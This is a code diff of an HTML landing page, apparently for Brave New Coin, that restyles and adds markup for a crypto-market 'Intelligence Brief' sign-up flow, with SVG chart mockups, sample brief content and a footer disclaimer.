+.quiz-success p { font-size: 14px; color: var(--text-muted); line-height: 1.65; max-width: 400px; margin: 0 auto 24px; }
+.report-summary {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 16px 20px;
+  text-align: left;
+  margin: 0 auto 24px;
+  max-width: 440px;
+}
+.report-summary-title {
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--text-faint);
+  text-transform: uppercase;
+  letter-spacing: 0.07em;
+  margin-bottom: 10px;
+}
+.report-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 5px 0;
+  border-bottom: 1px solid var(--border);
+}
+.report-row:last-child { border-bottom: none; }
+.report-row-k { font-size: 12px; color: var(--text-muted); }
+.report-row-v { font-size: 12px; font-weight: 600; font-family: var(--mono); color: var(--text); }
+.btn-confirm {
+  background: var(--brand-primary);
+  color: #fff;
+  padding: 13px 32px;
+  border-radius: var(--radius);
+  font-size: 14px;
+  font-weight: 700;
+  cursor: pointer;
+  border: none;
+  transition: background .15s;
+  margin-bottom: 10px;
+}
+.btn-confirm:hover { background: var(--brand-primary-dark); }
+.success-note { font-size: 11px; font-family: var(--mono); color: var(--text-faint); }
 
-        .btn-primary {
-            background: var(--brand-primary);
-            color: #fff;
-            padding: 13px 28px;
-            border-radius: var(--radius);
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            border: none;
-            transition: background .15s, transform .1s, box-shadow .15s;
-            box-shadow: 0 4px 16px rgba(0,123,255,0.28);
-        }
+/* ═══════════════════════════════════════════
+   RESPONSIVE
+═══════════════════════════════════════════ */
+@media (max-width: 860px) {
+  .hero { grid-template-columns: 1fr; padding: 48px 20px 40px; gap: 40px; }
+  .hero h1 { font-size: 30px; }
+  .feature-grid { grid-template-columns: 1fr; }
+  .mockup-wrapper { grid-template-columns: 1fr; }
+  .trust-inner { justify-content: flex-start; gap: 20px; }
+  .trust-divider { display: none; }
+  .nav { padding: 0 20px; }
+  .nav-links { display: none; }
+  .section { padding: 56px 20px; }
+  .quiz-body { padding: 24px 20px; }
+  .quiz-footer { padding: 0 20px 24px; }
+  .footer-inner { flex-direction: column; }
+  .hero-panel { display: none; }
+}
 
-        .btn-primary:hover {
-            background: var(--brand-primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 24px rgba(0,123,255,0.36);
-        }
+@media (prefers-reduced-motion: reduce) {
+  *,*::before,*::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+}
+</style>
+</head>
+<body>
 
-        .btn-secondary {
-            background: transparent;
-            color: var(--text-muted);
-            padding: 13px 20px;
-            border-radius: var(--radius);
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            border: 1px solid var(--border);
-            transition: all .15s;
-        }
+<!-- ░░░░░ NAV ░░░░░ -->
+<nav class="nav">
+  <div class="nav-inner">
+    <div class="nav-logo">
+      <!-- BNC Geometric Logo SVG -->
+      <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <rect width="32" height="32" rx="6" fill="#007BFF"/>
+        <rect x="7" y="7" width="7" height="7" rx="1.2" fill="white"/>
+        <rect x="7" y="18" width="7" height="7" rx="1.2" fill="white" opacity="0.5"/>
+        <rect x="18" y="7" width="7" height="7" rx="1.2" fill="white" opacity="0.7"/>
+        <path d="M18 21.5 L22 17.5 L25 20" stroke="#FF9F00" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M22 17.5 L22 25" stroke="#FF9F00" stroke-width="2.2" stroke-linecap="round"/>
+      </svg>
+      <span>Brave New Coin</span>
+    </div>
+    <ul class="nav-links">
+      <li><a href="#">Reference Rates</a></li>
+      <li><a href="#">API Indices</a></li>
+      <li><a href="#">Taxonomy</a></li>
+      <li><a href="#">Data Coverage</a></li>
+      <li><a href="#">Research</a></li>
+    </ul>
+    <button class="nav-cta" onclick="openQuiz()">Request Intelligence Brief →</button>
+  </div>
+</nav>
 
-        .btn-secondary:hover {
-            border-color: var(--brand-primary);
-            color: var(--brand-primary);
-        }
+<!-- ░░░░░ HERO ░░░░░ -->
+<section class="hero">
+  <div class="hero-left">
+    <div class="hero-badge">
+      <span class="hero-badge-dot"></span>
+      Live Data Infrastructure — Updated Every 15 min
+    </div>
+    <div class="hero-eyebrow">BNC Institutional Intelligence Series</div>
+    <h1>Your Personalized<br/>Digital Asset<br/><span>Reference Brief</span></h1>
+    <p class="hero-sub">BNC constructs institutional-grade reference rates, custom API indices, and cryptographic taxonomies trusted by regulators, exchanges, and asset managers globally. Receive a tailored intelligence brief mapped to your mandate and portfolio scope.</p>
+    <div class="hero-actions">
+      <button class="btn-primary" onclick="openQuiz()">Build My Intelligence Brief →</button>
+      <button class="btn-secondary">View Methodology ↗</button>
+    </div>
+    <div class="hero-disclaimer">ISO 27001 aligned &nbsp;·&nbsp; SOC 2 infrastructure &nbsp;·&nbsp; No spam. No data resale.</div>
+  </div>
+  <div class="hero-right">
+    <div class="hero-panel">
+      <div class="hero-panel-bar">
+        <span class="panel-dot r"></span>
+        <span class="panel-dot y"></span>
+        <span class="panel-dot g"></span>
+        <span class="panel-bar-title">BNC REFERENCE RATE TERMINAL — LIVE FEED</span>
+      </div>
+      <div class="hero-panel-tabs">
+        <div class="panel-tab active">BLXC Index</div>
+        <div class="panel-tab">BNC30</div>
+        <div class="panel-tab">DeFi Layer</div>
+        <div class="panel-tab">API Status</div>
+      </div>
+      <div class="hero-panel-body">
+        <div class="panel-section-label">Benchmark Reference Rates — USD</div>
+        <!-- Mini candlestick SVG -->
+        <svg width="100%" height="64" viewBox="0 0 380 64" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-bottom:12px;border-radius:4px;background:#F4F7FC;">
+          <!-- Moving avg line -->
+          <polyline points="0,42 28,38 56,34 84,36 112,28 140,30 168,22 196,24 224,18 252,20 280,16 308,20 336,14 380,10" stroke="#007BFF" stroke-width="1.5" fill="none" opacity="0.6"/>
+          <!-- Candlesticks -->
+          <line x1="16" y1="44" x2="16" y2="28" stroke="#F03D3D" stroke-width="1"/>
+          <rect x="10" y="32" width="12" height="8" fill="#F03D3D" rx="1"/>
+          <line x1="44" y1="40" x2="44" y2="26" stroke="#00C48C" stroke-width="1"/>
+          <rect x="38" y="28" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="72" y1="38" x2="72" y2="22" stroke="#00C48C" stroke-width="1"/>
+          <rect x="66" y="24" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="100" y1="42" x2="100" y2="28" stroke="#F03D3D" stroke-width="1"/>
+          <rect x="94" y="32" width="12" height="8" fill="#F03D3D" rx="1"/>
+          <line x1="128" y1="34" x2="128" y2="18" stroke="#00C48C" stroke-width="1"/>
+          <rect x="122" y="20" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="156" y1="30" x2="156" y2="14" stroke="#00C48C" stroke-width="1"/>
+          <rect x="150" y="16" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="184" y1="28" x2="184" y2="14" stroke="#F03D3D" stroke-width="1"/>
+          <rect x="178" y="18" width="12" height="8" fill="#F03D3D" rx="1"/>
+          <line x1="212" y1="24" x2="212" y2="10" stroke="#00C48C" stroke-width="1"/>
+          <rect x="206" y="12" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="240" y1="22" x2="240" y2="8" stroke="#00C48C" stroke-width="1"/>
+          <rect x="234" y="10" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="268" y1="20" x2="268" y2="6" stroke="#F03D3D" stroke-width="1"/>
+          <rect x="262" y="10" width="12" height="8" fill="#F03D3D" rx="1"/>
+          <line x1="296" y1="18" x2="296" y2="4" stroke="#00C48C" stroke-width="1"/>
+          <rect x="290" y="6" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="324" y1="16" x2="324" y2="2" stroke="#00C48C" stroke-width="1"/>
+          <rect x="318" y="4" width="12" height="8" fill="#00C48C" rx="1"/>
+          <line x1="360" y1="14" x2="360" y2="2" stroke="#00C48C" stroke-width="1"/>
+          <rect x="354" y="4" width="12" height="8" fill="#00C48C" rx="1"/>
+          <!-- Breakout flag -->
+          <line x1="280" y1="2" x2="340" y2="2" stroke="#FF9F00" stroke-width="1" stroke-dasharray="4 2"/>
+          <text x="284" y="13" font-family="JetBrains Mono,monospace" font-size="8" fill="#FF9F00">BREAKOUT</text>
+        </svg>
+        <div class="panel-row">
+          <span><span class="panel-row-name">Bitcoin</span><span class="panel-row-ticker">BTC-BLXC</span></span>
+          <span class="panel-row-val up">+3.24%</span>
+        </div>
+        <div class="panel-row">
+          <span><span class="panel-row-name">Ethereum</span><span class="panel-row-ticker">ETH-BLXC</span></span>
+          <span class="panel-row-val up">+1.87%</span>
+        </div>
+        <div class="panel-row">
+          <span><span class="panel-row-name">Solana</span><span class="panel-row-ticker">SOL-BLXC</span></span>
+          <span class="panel-row-val dn">−0.62%</span>
+        </div>
+        <div class="panel-row">
+          <span><span class="panel-row-name">BNC30 Index</span><span class="panel-row-ticker">COMPOSITE</span></span>
+          <span class="panel-row-val nt">±0.08%</span>
+        </div>
+        <div style="margin-top:12px;padding:8px 10px;background:#EEF6FF;border-radius:4px;border:1px solid #C2DCFF;">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--brand-primary);font-weight:700;margin-bottom:2px;">API ENDPOINT STATUS</div>
+          <div style="font-family:var(--mono);font-size:10px;color:var(--text-muted);">v2/rates/btc &nbsp;<span style="color:var(--brand-green);">● 99.98% uptime</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
 
-        .hero-disclaimer {
-            margin-top: 14px;
-            font-size: 11px;
-            font-family: var(--mono);
-            color: var(--text-faint);
-        }
+<!-- ░░░░░ TRUST STRIP ░░░░░ -->
+<div class="trust-strip">
+  <div class="trust-inner">
+    <div class="trust-stat">
+      <div class="trust-stat-val"><em>400+</em></div>
+      <div class="trust-stat-label">Institutional Clients</div>
+    </div>
+    <div class="trust-divider"></div>
+    <div class="trust-stat">
+      <div class="trust-stat-val"><em>$2.4T</em></div>
+      <div class="trust-stat-label">Assets Referenced Daily</div>
+    </div>
+    <div class="trust-divider"></div>
+    <div class="trust-stat">
+      <div class="trust-stat-val"><em>750+</em></div>
+      <div class="trust-stat-label">Digital Assets Covered</div>
+    </div>
+    <div class="trust-divider"></div>
+    <div class="trust-stat">
+      <div class="trust-stat-val"><em>98.7ms</em></div>
+      <div class="trust-stat-label">Avg. API Response Latency</div>
+    </div>
+    <div class="trust-divider"></div>
+    <div class="trust-stat">
+      <div class="trust-stat-val"><em>2014</em></div>
+      <div class="trust-stat-label">Year Established</div>
+    </div>
+    <div class="trust-divider"></div>
+    <div class="trust-stat">
+      <div class="trust-stat-val"><em>24/7</em></div>
+      <div class="trust-stat-label">Live Rate Infrastructure</div>
+    </div>
+  </div>
+</div>
 
-        /* Hero right - dashboard panel */
-        .hero-panel {
-            background: var(--bg-secondary);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-lg);
-            overflow: hidden;
-            box-shadow: var(--shadow-card);
-        }
+<!-- ░░░░░ FEATURE GRID ░░░░░ -->
+<section class="section">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-kicker">What's Inside Your Brief</div>
+      <h2 class="section-title">Six Intelligence Layers.<br/>Built Around Your Mandate.</h2>
+      <p class="section-sub">Every brief is constructed from the intersection of your stated exposure objectives, time horizon, and risk parameters — cross-referenced against BNC's proprietary data infrastructure.</p>
+    </div>
+    <div class="feature-grid">
 
-        .hero-panel-bar {
-            background: var(--bg-dark);
-            padding: 10px 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+      <div class="feature-card">
+        <div class="feature-viz">
+          <!-- Gauge SVG -->
+          <svg width="140" height="90" viewBox="0 0 140 90" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="gaugeGrad" x1="0" y1="0" x2="1" y2="0">
+                <stop offset="0%" stop-color="#00C48C"/>
+                <stop offset="50%" stop-color="#FF9F00"/>
+                <stop offset="100%" stop-color="#F03D3D"/>
+              </linearGradient>
+            </defs>
+            <path d="M20 76 A50 50 0 0 1 120 76" stroke="url(#gaugeGrad)" stroke-width="10" fill="none" stroke-linecap="round"/>
+            <path d="M20 76 A50 50 0 0 1 80 30" stroke="#EEF3FB" stroke-width="10" fill="none" stroke-linecap="round" opacity="0.5"/>
+            <!-- Needle -->
+            <line x1="70" y1="76" x2="98" y2="42" stroke="#007BFF" stroke-width="2.5" stroke-linecap="round"/>
+            <circle cx="70" cy="76" r="5" fill="#007BFF"/>
+            <text x="17" y="88" font-family="JetBrains Mono,monospace" font-size="8" fill="#00C48C">LOW</text>
+            <text x="113" y="88" font-family="JetBrains Mono,monospace" font-size="8" fill="#F03D3D">HIGH</text>
+            <text x="50" y="68" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#007BFF">6.2</text>
+          </svg>
+        </div>
+        <h3>Custom Risk Mitigation Flags</h3>
+        <p>Quantified risk score mapped to your stated tolerance. Flags include volatility thresholds, drawdown alerts, and correlated-asset exposure warnings tailored to your portfolio mandate.</p>
+        <div class="feature-tag">Risk Layer</div>
+      </div>
 
-        .panel-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-        }
+      <div class="feature-card">
+        <div class="feature-viz">
+          <!-- Taxonomy tree SVG -->
+          <svg width="180" height="90" viewBox="0 0 180 90" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="72" y="4" width="36" height="18" rx="3" fill="#007BFF"/>
+            <text x="90" y="16" font-family="JetBrains Mono,monospace" font-size="8" fill="white" text-anchor="middle">DIGITAL</text>
+            <line x1="90" y1="22" x2="90" y2="36" stroke="#D6E2F0" stroke-width="1.5"/>
+            <line x1="90" y1="36" x2="40" y2="36" stroke="#D6E2F0" stroke-width="1.5"/>
+            <line x1="90" y1="36" x2="140" y2="36" stroke="#D6E2F0" stroke-width="1.5"/>
+            <line x1="40" y1="36" x2="40" y2="48" stroke="#D6E2F0" stroke-width="1.5"/>
+            <line x1="140" y1="36" x2="140" y2="48" stroke="#D6E2F0" stroke-width="1.5"/>
+            <rect x="16" y="48" width="48" height="16" rx="3" fill="#EEF6FF" stroke="#C2DCFF"/>
+            <text x="40" y="59" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#007BFF" text-anchor="middle">PoW ASSETS</text>
+            <rect x="116" y="48" width="48" height="16" rx="3" fill="#FFF5E0" stroke="#FFD980"/>
+            <text x="140" y="59" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#CC7E00" text-anchor="middle">DeFi LAYER</text>
+            <line x1="40" y1="64" x2="40" y2="72" stroke="#D6E2F0" stroke-width="1.5"/>
+            <line x1="140" y1="64" x2="140" y2="72" stroke="#D6E2F0" stroke-width="1.5"/>
+            <rect x="22" y="72" width="36" height="14" rx="2" fill="#E0FAF3" stroke="#A0EAD3"/>
+            <text x="40" y="82" font-family="JetBrains Mono,monospace" font-size="7" fill="#007A59" text-anchor="middle">BTC · LTC</text>
+            <rect x="122" y="72" width="36" height="14" rx="2" fill="#E0FAF3" stroke="#A0EAD3"/>
+            <text x="140" y="82" font-family="JetBrains Mono,monospace" font-size="7" fill="#007A59" text-anchor="middle">UNI · AAVE</text>
+          </svg>
+        </div>
+        <h3>Cryptographic Asset Taxonomy</h3>
+        <p>BNC's classification taxonomy segments over 750 digital assets across protocol layers, consensus mechanisms, and sector verticals — giving your brief structured, navigable asset coverage.</p>
+        <div class="feature-tag amber">Taxonomy Layer</div>
+      </div>
 
-        .panel-dot.r {
-            background: #F03D3D;
-        }
+      <div class="feature-card">
+        <div class="feature-viz">
+          <!-- Bar chart -->
+          <svg width="160" height="88" viewBox="0 0 160 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <line x1="10" y1="78" x2="155" y2="78" stroke="#D6E2F0" stroke-width="1"/>
+            <rect x="16" y="28" width="18" height="50" rx="2" fill="#007BFF"/>
+            <rect x="44" y="14" width="18" height="64" rx="2" fill="#007BFF" opacity="0.8"/>
+            <rect x="72" y="38" width="18" height="40" rx="2" fill="#007BFF" opacity="0.6"/>
+            <rect x="100" y="22" width="18" height="56" rx="2" fill="#FF9F00" opacity="0.9"/>
+            <rect x="128" y="10" width="18" height="68" rx="2" fill="#007BFF" opacity="0.7"/>
+            <text x="25" y="86" font-family="JetBrains Mono,monospace" font-size="7" fill="#8BA3BE" text-anchor="middle">L1</text>
+            <text x="53" y="86" font-family="JetBrains Mono,monospace" font-size="7" fill="#8BA3BE" text-anchor="middle">L2</text>
+            <text x="81" y="86" font-family="JetBrains Mono,monospace" font-size="7" fill="#8BA3BE" text-anchor="middle">DeFi</text>
+            <text x="109" y="86" font-family="JetBrains Mono,monospace" font-size="7" fill="#CC7E00" text-anchor="middle">Stbl</text>
+            <text x="137" y="86" font-family="JetBrains Mono,monospace" font-size="7" fill="#8BA3BE" text-anchor="middle">RWA</text>
+          </svg>
+        </div>
+        <h3>Sector Allocation Analysis</h3>
+        <p>Distribution of exposure across protocol layers, sector verticals, and asset classes — quantified against BNC's composite reference benchmarks and your declared time horizon.</p>
+        <div class="feature-tag green">Portfolio Layer</div>
+      </div>
 
-        .panel-dot.y {
-            background: #FFB800;
-        }
+      <div class="feature-card">
+        <div class="feature-viz">
+          <!-- API doc block SVG -->
+          <svg width="220" height="88" viewBox="0 0 220 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="8" y="6" width="204" height="76" rx="4" fill="#0B1220" stroke="#1E2D47"/>
+            <rect x="16" y="14" width="36" height="12" rx="2" fill="#003A80"/>
+            <text x="34" y="23" font-family="JetBrains Mono,monospace" font-size="8" fill="#5BAEFF" text-anchor="middle">GET</text>
+            <text x="60" y="23" font-family="JetBrains Mono,monospace" font-size="8" fill="rgba(255,255,255,0.7)">/v2/rates/btc</text>
+            <text x="16" y="40" font-family="JetBrains Mono,monospace" font-size="7.5" fill="rgba(255,255,255,0.3)">200 OK · 98ms</text>
+            <rect x="16" y="46" width="188" height="1" fill="#1E2D47"/>
+            <text x="16" y="60" font-family="JetBrains Mono,monospace" font-size="7.5" fill="rgba(255,255,255,0.4)">"rate":</text>
+            <text x="56" y="60" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#00C48C">"67,421.84"</text>
+            <text x="16" y="72" font-family="JetBrains Mono,monospace" font-size="7.5" fill="rgba(255,255,255,0.4)">"source_count":</text>
+            <text x="112" y="72" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#FF9F00">"42 exchanges"</text>
+          </svg>
+        </div>
+        <h3>Tailored API Index Configuration</h3>
+        <p>Receive a brief outlining BNC's available custom index methodologies, weighting schemes, and constituent eligibility criteria relevant to your stated asset focus and rebalancing cadence.</p>
+        <div class="feature-tag">API Layer</div>
+      </div>
 
-        .panel-dot.g {
-            background: #00C48C;
-        }
+      <div class="feature-card">
+        <div class="feature-viz">
+          <!-- Scatter plot / correlation matrix hint -->
+          <svg width="160" height="88" viewBox="0 0 160 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="8" y="6" width="144" height="76" rx="3" fill="#F4F7FC" stroke="#D6E2F0"/>
+            <text x="16" y="18" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#5A7190">CORR MATRIX</text>
+            <!-- Cells -->
+            <rect x="16" y="24" width="18" height="14" rx="1" fill="#007BFF" opacity="1.0"/>
+            <rect x="38" y="24" width="18" height="14" rx="1" fill="#007BFF" opacity="0.72"/>
+            <rect x="60" y="24" width="18" height="14" rx="1" fill="#007BFF" opacity="0.45"/>
+            <rect x="82" y="24" width="18" height="14" rx="1" fill="#F03D3D" opacity="0.3"/>
+            <rect x="104" y="24" width="18" height="14" rx="1" fill="#007BFF" opacity="0.2"/>
+            <rect x="16" y="42" width="18" height="14" rx="1" fill="#007BFF" opacity="0.72"/>
+            <rect x="38" y="42" width="18" height="14" rx="1" fill="#007BFF" opacity="1.0"/>
+            <rect x="60" y="42" width="18" height="14" rx="1" fill="#007BFF" opacity="0.55"/>
+            <rect x="82" y="42" width="18" height="14" rx="1" fill="#F03D3D" opacity="0.2"/>
+            <rect x="104" y="42" width="18" height="14" rx="1" fill="#007BFF" opacity="0.35"/>
+            <rect x="16" y="60" width="18" height="14" rx="1" fill="#007BFF" opacity="0.3"/>
+            <rect x="38" y="60" width="18" height="14" rx="1" fill="#007BFF" opacity="0.45"/>
+            <rect x="60" y="60" width="18" height="14" rx="1" fill="#007BFF" opacity="1.0"/>
+            <rect x="82" y="60" width="18" height="14" rx="1" fill="#007BFF" opacity="0.6"/>
+            <rect x="104" y="60" width="18" height="14" rx="1" fill="#F03D3D" opacity="0.15"/>
+            <text x="125" y="20" font-family="JetBrains Mono,monospace" font-size="7" fill="#007BFF">1.00</text>
+            <text x="125" y="52" font-family="JetBrains Mono,monospace" font-size="7" fill="#007BFF">0.72</text>
+            <text x="125" y="70" font-family="JetBrains Mono,monospace" font-size="7" fill="#F03D3D">−0.1</text>
+          </svg>
+        </div>
+        <h3>Market Structure Correlation Notes</h3>
+        <p>Cross-asset correlation coefficients computed across your selected focus sectors. Identifies diversification gaps, regime-dependent clustering, and structural alpha opportunities.</p>
+        <div class="feature-tag green">Structure Layer</div>
+      </div>
 
-        .panel-bar-title {
-            font-family: var(--mono);
-            font-size: 11px;
-            color: rgba(255,255,255,0.4);
-            margin-left: 8px;
-        }
+      <div class="feature-card">
+        <div class="feature-viz">
+          <!-- Data table rows -->
+          <svg width="200" height="88" viewBox="0 0 200 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="6" y="6" width="188" height="76" rx="3" fill="#fff" stroke="#D6E2F0"/>
+            <rect x="6" y="6" width="188" height="20" rx="3" fill="#EEF3FB"/>
+            <text x="16" y="19" font-family="JetBrains Mono,monospace" font-size="8" font-weight="700" fill="#5A7190">ASSET</text>
+            <text x="90" y="19" font-family="JetBrains Mono,monospace" font-size="8" font-weight="700" fill="#5A7190">BENCHMARK</text>
+            <text x="162" y="19" font-family="JetBrains Mono,monospace" font-size="8" font-weight="700" fill="#5A7190">DELTA</text>
+            <text x="16" y="37" font-family="JetBrains Mono,monospace" font-size="8" fill="#0D1B2E">BTC</text>
+            <text x="90" y="37" font-family="JetBrains Mono,monospace" font-size="8" fill="#0D1B2E">BLXC-BTC</text>
+            <text x="162" y="37" font-family="JetBrains Mono,monospace" font-size="8" fill="#00C48C">+3.2%</text>
+            <line x1="6" y1="42" x2="194" y2="42" stroke="#D6E2F0"/>
+            <text x="16" y="55" font-family="JetBrains Mono,monospace" font-size="8" fill="#0D1B2E">ETH</text>
+            <text x="90" y="55" font-family="JetBrains Mono,monospace" font-size="8" fill="#0D1B2E">BLXC-ETH</text>
+            <text x="162" y="55" font-family="JetBrains Mono,monospace" font-size="8" fill="#00C48C">+1.8%</text>
+            <line x1="6" y1="60" x2="194" y2="60" stroke="#D6E2F0"/>
+            <text x="16" y="73" font-family="JetBrains Mono,monospace" font-size="8" fill="#0D1B2E">SOL</text>
+            <text x="90" y="73" font-family="JetBrains Mono,monospace" font-size="8" fill="#0D1B2E">BLXC-SOL</text>
+            <text x="162" y="73" font-family="JetBrains Mono,monospace" font-size="8" fill="#F03D3D">−0.6%</text>
+          </svg>
+        </div>
+        <h3>Benchmark Delta & Attribution Report</h3>
+        <p>Compares your focus asset performance against BNC's composite benchmarks. Includes attribution analysis to isolate sector, protocol, and macro-driven return drivers over your stated horizon.</p>
+        <div class="feature-tag amber">Attribution Layer</div>
+      </div>
 
-        .hero-panel-tabs {
-            display: flex;
-            border-bottom: 1px solid var(--border);
-            background: #F8FAFD;
-        }
+    </div>
+  </div>
+</section>
 
-        .panel-tab {
-            padding: 8px 16px;
-            font-family: var(--mono);
-            font-size: 11px;
-            font-weight: 500;
-            color: var(--text-muted);
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-            white-space: nowrap;
-        }
+<!-- ░░░░░ SAMPLE OUTPUT MOCKUP ░░░░░ -->
+<section class="section section-dark">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-kicker">Sample Output</div>
+      <h2 class="section-title">What Your Personalized Brief<br/>Looks Like — In Practice</h2>
+      <p class="section-sub">A representative output compiled from BNC's institutional data layer. Your brief adapts every field to reflect your specific mandate, asset focus, and risk profile.</p>
+    </div>
+    <div class="mockup-wrapper">
+      <div class="mockup-panel">
+        <div class="mockup-header">
+          <span class="mockup-title">BNC Intelligence Brief</span>
+          <span class="mockup-badge">● Compiled</span>
+        </div>
+        <div class="mockup-body">
+          <div class="mockup-row"><span class="mockup-key">Recipient</span><span class="mockup-val white">Portfolio Manager (Inst.)</span></div>
+          <div class="mockup-row"><span class="mockup-key">Experience Tier</span><span class="mockup-val blue">Professional</span></div>
+          <div class="mockup-row"><span class="mockup-key">Primary Mandate</span><span class="mockup-val amber">Long-Term Appreciation</span></div>
+          <div class="mockup-row"><span class="mockup-key">Horizon</span><span class="mockup-val white">12–36 Months</span></div>
+          <div class="mockup-row"><span class="mockup-key">Risk Band</span><span class="mockup-val amber">Moderate-High (6.2 / 10)</span></div>
+          <div class="mockup-row"><span class="mockup-key">Focus Sectors</span><span class="mockup-val blue">L1 · DeFi · RWA</span></div>
+          <div class="mockup-row"><span class="mockup-key">Benchmark Set</span><span class="mockup-val white">BNC30 + BLXC-DeFi</span></div>
+          <div class="mockup-row"><span class="mockup-key">Compiled</span><span class="mockup-val green" id="mockup-date">—</span></div>
+        </div>
+      </div>
+      <div class="mockup-right">
+        <div class="mockup-section">
+          <div class="mockup-section-head">
+            <span class="mockup-section-icon" style="background:var(--brand-red)"></span>
+            <span class="mockup-section-label">Custom Risk Mitigation Flags</span>
+          </div>
+          <div class="mockup-section-body">
+            <div class="flag-item">
+              <span class="flag-dot" style="background:#F03D3D"></span>
+              <div><div class="flag-text">Correlated drawdown probability elevated for L1 assets during macro tightening cycles. Recommend staggered entry protocol.</div><div class="flag-sub">SIGNAL: RISK-001 · BNC Volatility Regime Model v4.1</div></div>
+            </div>
+            <div class="flag-item">
+              <span class="flag-dot" style="background:#FF9F00"></span>
+              <div><div class="flag-text">DeFi TVL compression trend detected across Ethereum L2 ecosystem. Monitor protocol-specific liquidity depth weekly.</div><div class="flag-sub">SIGNAL: STRUCT-014 · BNC DeFi Taxonomy Feed</div></div>
+            </div>
+            <div class="flag-item">
+              <span class="flag-dot" style="background:#00C48C"></span>
+              <div><div class="flag-text">RWA tokenization pipeline on-chain velocity increasing. BNC taxonomy score upgrade for 3 underlying issuers.</div><div class="flag-sub">SIGNAL: TAXA-007 · BNC Asset Classification Engine</div></div>
+            </div>
+          </div>
+        </div>
+        <div class="mockup-section">
+          <div class="mockup-section-head">
+            <span class="mockup-section-icon" style="background:var(--brand-primary)"></span>
+            <span class="mockup-section-label">Tailored Market Structure Notes</span>
+          </div>
+          <div class="mockup-section-body">
+            <div class="flag-item">
+              <span class="flag-dot" style="background:#007BFF"></span>
+              <div><div class="flag-text">BTC BLXC reference rate reclaimed 12-week structural support at $62,800. Historical recovery pattern observed in 7/9 comparable regimes.</div><div class="flag-sub">DATA: BLXC-BTC · BNC Reference Rate API</div></div>
+            </div>
+            <div class="flag-item">
+              <span class="flag-dot" style="background:#007BFF"></span>
+              <div><div class="flag-text">Solana validator concentration metrics stabilized. Network health score: 8.4/10 vs. prior-quarter 6.1/10 under BNC taxonomy criteria.</div><div class="flag-sub">DATA: BLXC-SOL · BNC Network Taxonomy v3</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
 
-        .panel-tab.active {
-            color: var(--brand-primary);
-            border-bottom-color: var(--brand-primary);
-            background: #fff;
-        }
+<!-- ░░░░░ FINAL CTA ░░░░░ -->
+<section class="final-cta">
+  <h2>Your Intelligence Brief Is<br/>Waiting to Be Compiled.</h2>
+  <p>Complete a 90-second profiling sequence. BNC's data infrastructure generates a tailored output mapped to your mandate, risk tolerance, and asset focus — delivered immediately.</p>
+  <button class="btn-white" onclick="openQuiz()">Begin Profile Sequence →</button>
+  <div class="final-cta-note">Institutional grade. No marketing noise. Unsubscribe at any time.</div>
+</section>
 
-        .hero-panel-body {
-            padding: 20px 20px 16px;
-        }
+<!-- ░░░░░ FOOTER ░░░░░ -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-brand">
+        <svg width="24" height="24" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <rect width="32" height="32" rx="6" fill="#007BFF"/>
+          <rect x="7" y="7" width="7" height="7" rx="1.2" fill="white"/>
+          <rect x="7" y="18" width="7" height="7" rx="1.2" fill="white" opacity="0.5"/>
+          <rect x="18" y="7" width="7" height="7" rx="1.2" fill="white" opacity="0.7"/>
+          <path d="M18 21.5 L22 17.5 L25 20" stroke="#FF9F00" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 17.5 L22 25" stroke="#FF9F00" stroke-width="2.2" stroke-linecap="round"/>
+        </svg>
+        <span class="footer-brand-name">Brave New Coin</span>
+      </div>
+      <p class="footer-legal">Brave New Coin is a capital markets data firm providing institutional-grade reference rates, customized API indices, and cryptographic taxonomies supporting transparent financial asset valuation. The Intelligence Brief is for informational purposes only and does not constitute investment advice, a solicitation, or an offer to buy or sell any financial instrument. BNC reference rates and indices are benchmark instruments intended for institutional and professional use.</p>
+    </div>
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Methodology</a>
+      <a href="#">Data Coverage</a>
+      <a href="#">API Docs</a>
+      <a href="#">Contact</a>
+    </div>
+  </div>
